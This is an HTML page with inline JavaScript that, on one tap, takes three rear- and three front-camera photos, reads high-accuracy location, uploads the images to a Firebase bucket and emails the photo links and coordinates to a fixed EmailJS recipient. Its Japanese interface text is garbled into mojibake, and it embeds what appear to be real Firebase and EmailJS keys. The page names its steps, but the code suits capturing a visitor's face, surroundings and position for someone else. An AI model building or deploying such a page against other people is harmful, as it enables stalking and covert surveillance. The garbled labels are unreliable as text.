<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ã‚«ãƒ¡ãƒ©ï¼‹ä½ç½®ï¼‹é€ä¿¡</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 20px;
    }
    .container { max-width: 800px; margin: auto; text-align: center; }
    .touch-area {
      border: 2px dashed rgba(255,255,255,0.3);
      background: rgba(255,255,255,0.1);
      padding: 40px;
      border-radius: 15px;
      margin: 20px 0;
      cursor: pointer;
    }
    .status { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; margin-top: 10px; }
    .log { text-align: left; font-size: 0.9em; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; margin-top: 10px; white-space: pre-wrap; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
    import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-storage.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
      authDomain: "picture-storage-906ae.firebaseapp.com",
      projectId: "picture-storage-906ae",
      storageBucket: "picture-storage-906ae.appspot.com",
      messagingSenderId: "134265329367",
      appId: "1:134265329367:web:b94063426b6307f8a8c292",
      measurementId: "G-9CP3F27EMF"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);

    const logBox = document.createElement("div");
    logBox.className = "log";
    document.addEventListener("DOMContentLoaded", () => {
      document.querySelector(".container").appendChild(logBox);
    });

    function log(...args) {
      const msg = `[${new Date().toLocaleTimeString()}] ${args.join(" ")}`;
      console.log(msg);
      logBox.textContent += msg + "\n";
    }

    emailjs.init("cPjKBUm_i6HebDQF7");

    const statusEl = document.getElementById("status");
    const video = document.getElementById("cameraVideo");
    const canvas = document.getElementById("photoCanvas");
    const touchArea = document.getElementById("touchArea");

    let processing = false;

    async function uploadImage(base64, fileName) {
      const storageRef = ref(storage, `images/${fileName}`);
      await uploadString(storageRef, base64, 'data_url');
      const url = await getDownloadURL(storageRef);
      return url;
    }

    function updateStatus(text, color = '') {
      statusEl.textContent = text;
      statusEl.style.background = color || 'rgba(0,0,0,0.4)';
      log("Status:", text);
    }

    async function capturePhotos(facingMode, label) {
      updateStatus(`ğŸ“¸ ${label}ã‚«ãƒ¡ãƒ©æ’®å½±ä¸­...`);
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
      video.srcObject = stream;
      video.style.display = 'block';
      await new Promise(r => setTimeout(r, 1000));

      const ctx = canvas.getContext("2d");
      const photos = [];

      for (let i = 0; i < 3; i++) {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64 = canvas.toDataURL("image/jpeg", 0.3);
        photos.push(base64);
        log(`${label} æ’®å½± ${i + 1} æšç›® ã‚µã‚¤ã‚º: ${(base64.length * 3 / 4 / 1024).toFixed(1)} KB`);
        await new Promise(r => setTimeout(r, 50));
      }

      stream.getTracks().forEach(t => t.stop());
      video.style.display = 'none';
      return photos;
    }

    async function getLocationInfo() {
      updateStatus("ğŸ“ ä½ç½®æƒ…å ±å–å¾—ä¸­...");
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const coords = pos.coords;
            const info = {
              lat: coords.latitude,
              lon: coords.longitude,
              acc: coords.accuracy,
              time: new Date(pos.timestamp).toLocaleString()
            };
            log(`ä½ç½®: ç·¯åº¦${info.lat}, çµŒåº¦${info.lon}, ç²¾åº¦${info.acc}m`);
            resolve(info);
          },
          err => reject(err),
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });
    }

    async function runAll() {
      if (processing) {
        updateStatus("âŒ å‡¦ç†ä¸­ã§ã™ã€‚äºŒé‡å®Ÿè¡Œã‚’é˜²æ­¢ã—ã¾ã™ã€‚", "#f44336");
        return;
      }
      processing = true;
      logBox.textContent = "";

      try {
        updateStatus("ğŸ”„ å¤–ã‚«ãƒ¡æ’®å½±...");
        const rearPhotos = await capturePhotos("environment", "å¤–ã‚«ãƒ¡");

        updateStatus("ğŸ”„ å†…ã‚«ãƒ¡æ’®å½±...");
        const frontPhotos = await capturePhotos("user", "å†…ã‚«ãƒ¡");

        let location;
        try {
          location = await getLocationInfo();
        } catch (e) {
          location = { lat: "å–å¾—å¤±æ•—", lon: "å–å¾—å¤±æ•—", acc: "ä¸æ˜", time: new Date().toLocaleString() };
          updateStatus("âš ï¸ ä½ç½®æƒ…å ±å¤±æ•—", "#ffa726");
        }

        updateStatus("â˜ï¸ Firebaseã«ç”»åƒã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰...", "#29b6f6");

        const rearUrls = await Promise.all(rearPhotos.map((p, i) =>
          uploadImage(p, `rear_${Date.now()}_${i}.jpg`)
        ));
        const frontUrls = await Promise.all(frontPhotos.map((p, i) =>
          uploadImage(p, `front_${Date.now()}_${i}.jpg`)
        ));

        updateStatus("âœ‰ï¸ Emailé€ä¿¡ä¸­...", "#29b6f6");

        const templateParams = {
          photo_rear1_url: rearUrls[0],
          photo_rear2_url: rearUrls[1],
          photo_rear3_url: rearUrls[2],
          photo_front1_url: frontUrls[0],
          photo_front2_url: frontUrls[1],
          photo_front3_url: frontUrls[2],
          location_info: `ç·¯åº¦: ${location.lat}<br>çµŒåº¦: ${location.lon}<br>ç²¾åº¦: ${location.acc}m<br>æ™‚åˆ»: ${location.time}`,
          date: new Date().toLocaleString()
        };

        await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
        updateStatus("âœ… ãƒ¡ãƒ¼ãƒ«é€ä¿¡å®Œäº†ï¼", "#66bb6a");
      } catch (e) {
        console.error(e);
        updateStatus("âŒ å…¨ä½“å‡¦ç†ä¸­ã«ã‚¨ãƒ©ãƒ¼", "#f44336");
        log("ã‚¨ãƒ©ãƒ¼è©³ç´°:", e?.message || e);
      } finally {
        processing = false;
      }
    }

    document.getElementById("touchArea").addEventListener("click", runAll);
    document.getElementById("touchArea").addEventListener("touchstart", e => {
      e.preventDefault(); runAll();
    }, { passive: false });
  </script>
</head>
<body>
<div class="container">
  <h1>ğŸ“· 3é€£å†™ï¼‹ä½ç½®é€ä¿¡ï¼ˆFirebaseçµŒç”±ï¼‰</h1>
  <p>å¤–ã‚«ãƒ¡ â†’ å†…ã‚«ãƒ¡ â†’ ä½ç½® â†’ Firebase â†’ EmailJSé€ä¿¡</p>
  <div class="touch-area" id="touchArea">â–¶ï¸ ã‚¿ãƒƒãƒ—/ã‚¯ãƒªãƒƒã‚¯ã—ã¦å®Ÿè¡Œ</div>
  <div class="status" id="status">å¾…æ©Ÿä¸­</div>
  <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
</div>
</body>
</html>
